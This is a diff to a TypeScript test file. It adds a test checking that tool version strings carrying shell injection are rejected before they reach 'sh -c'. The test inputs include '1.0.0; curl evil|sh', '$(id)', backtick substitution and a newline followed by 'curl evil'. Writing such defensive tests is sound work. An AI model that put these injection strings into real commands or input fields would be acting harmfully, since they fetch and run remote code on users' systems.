@@ -6,7 +6,13 @@ import { join } from "node:path";
 import { AppError } from "../src/lib/errors";
 import { desiredToolsOf, installEnv } from "../src/services/tools";
 import { findCatalogEntry, loadCatalog, parseCatalogEntry } from "../src/tools/catalog";
-import { commandFor, detectCommand, packageSpec, renderCommand } from "../src/tools/commands";
+import {
+  assertSafeToolVersion,
+  commandFor,
+  detectCommand,
+  packageSpec,
+  renderCommand,
+} from "../src/tools/commands";
 import type { CatalogEntry } from "../src/tools/types";
 
 const sample: CatalogEntry = {
@@ -67,6 +73,19 @@ describe("tool command generation", () => {
     const pip: CatalogEntry = { ...sample, id: "aider", source: "pip", package: "aider-chat", bin: "aider" };
     expect(packageSpec(pip, "latest")).toBe("aider-chat");
     expect(packageSpec(pip, "0.80.0")).toBe("aider-chat==0.80.0");
+  });
+
+  test("rejects unsafe versions that would inject into sh -c", () => {
+    const evil = "1.0.0; curl evil|sh";
+    expect(() => assertSafeToolVersion(evil)).toThrow(AppError);
+    expect(() => packageSpec(sample, evil)).toThrow(AppError);
+    expect(() => commandFor(sample, "install", evil)).toThrow(AppError);
+    expect(() => packageSpec(sample, "1.0.0$(id)")).toThrow(AppError);
+    expect(() => packageSpec(sample, "1.0.0`id`")).toThrow(AppError);
+    expect(() => packageSpec(sample, "1.0.0 && true")).toThrow(AppError);
+    expect(() => packageSpec(sample, "1.0.0\ncurl evil")).toThrow(AppError);
+    expect(assertSafeToolVersion("v1.2.3-beta.1")).toBe("v1.2.3-beta.1");
+    expect(assertSafeToolVersion("  latest  ")).toBe("latest");
   });
 
   test("renders install, upgrade, uninstall and detect commands", () => {
